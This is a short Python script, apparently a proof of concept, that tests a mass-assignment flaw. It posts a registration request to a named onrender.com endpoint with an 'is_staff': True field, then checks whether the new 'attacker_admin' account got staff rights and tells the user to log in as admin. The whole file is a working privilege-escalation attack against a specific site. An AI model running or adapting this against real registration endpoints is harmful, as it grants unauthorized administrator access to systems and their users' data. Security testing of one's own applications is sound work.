import requests

# Target endpoint
BASE_URL = "https://lxg-mque.onrender.com"
ENDPOINT = "/api/auth/register/"

print(f"--- Starting Privilege Escalation Attack on {ENDPOINT} ---")

# The malicious payload including 'is_staff': True
payload = {
    "username": "attacker_admin",
    "email": "attacker@example.com",
    "password": "Password123!",
    "is_staff": True
}

try:
    response = requests.post(f"{BASE_URL}{ENDPOINT}", json=payload)
    if response.status_code == 201:
        data = response.json()
        print("SUCCESS: User created!")
        print(f"Username: {data.get('username')}")
        print(f"Is Staff (Admin): {data.get('is_staff')}")
        
        if data.get('is_staff') == True:
            print("\n[!] ATTACK SUCCESSFUL: You have successfully escalated privileges to Admin.")
            print("Action: Now go to the login page and sign in as 'attacker_admin'.")
        else:
            print("\n[x] ATTACK FAILED: The is_staff field was ignored.")
    else:
        print(f"FAILED: Status Code {response.status_code}")
        print(response.json())

except Exception as e:
    print(f"ERROR: {e}")

print("\n--- Attack Simulation Complete ---")
